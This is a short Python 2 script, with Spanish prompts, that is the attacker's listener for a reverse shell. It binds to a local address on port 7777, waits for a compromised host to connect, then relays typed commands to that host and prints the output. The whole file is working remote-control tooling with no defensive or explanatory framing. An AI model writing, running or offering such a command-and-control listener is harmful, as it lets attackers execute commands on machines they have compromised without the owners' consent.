#!-usr-bin-env python
#_*_coding: utf8 _*_

import socket



def shell():
     current_dir = target.recv(1024)
     while True:
         comando = raw_input("{}~#: ".format(current_dir))
         if comando == "exit":
             target.send(comando)
             break
         else:
             target.send(comando)
             res = target.recv(1024)
             print(res)
                   

def upserver():
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('192.168.1.85' , 7777))
    server.listen(1)

    print("Corriendo servidor y esperando conexiones...")

    target, ip = server.accept()
    print("Conexion recibida de: " + str(ip[0]))

upserver()
shell()
server.close()